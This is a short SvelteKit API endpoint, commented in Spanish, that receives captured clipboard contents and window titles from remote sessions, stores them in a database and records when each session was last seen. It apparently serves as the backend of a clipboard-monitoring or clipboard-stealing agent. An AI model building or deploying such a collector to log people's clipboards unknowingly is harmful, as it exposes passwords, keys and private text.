// ------------------------------------------------------------------
// API — Recepción de portapapeles capturado
// ------------------------------------------------------------------
// Recibe contenido del portapapeles cuando cambia:
//   { session_id, content, window_title }
// ------------------------------------------------------------------

import type { RequestHandler } from './$types';
import sql from '$lib/server/db';

export const POST: RequestHandler = async ({ request }) => {
	const body = await request.json();
	const { session_id, content, window_title } = body;

	if (!session_id || !content) {
		return new Response(JSON.stringify({ error: 'session_id and content required' }), {
			status: 400,
			headers: { 'Content-Type': 'application/json' },
		});
	}

	try {
		await sql`
			INSERT INTO clipboard_logs (session_id, content, window_title)
			VALUES (${session_id}, ${content}, ${window_title ?? ''})
		`;

		await sql`
			UPDATE sessions SET last_seen = NOW() WHERE id = ${session_id}
		`;

		return new Response(JSON.stringify({ ok: true }), {
			headers: { 'Content-Type': 'application/json' },
		});
	} catch (err) {
		console.error('Error en clipboard:', err);
		return new Response(JSON.stringify({ error: 'DB error' }), {
			status: 500,
			headers: { 'Content-Type': 'application/json' },
		});
	}
};
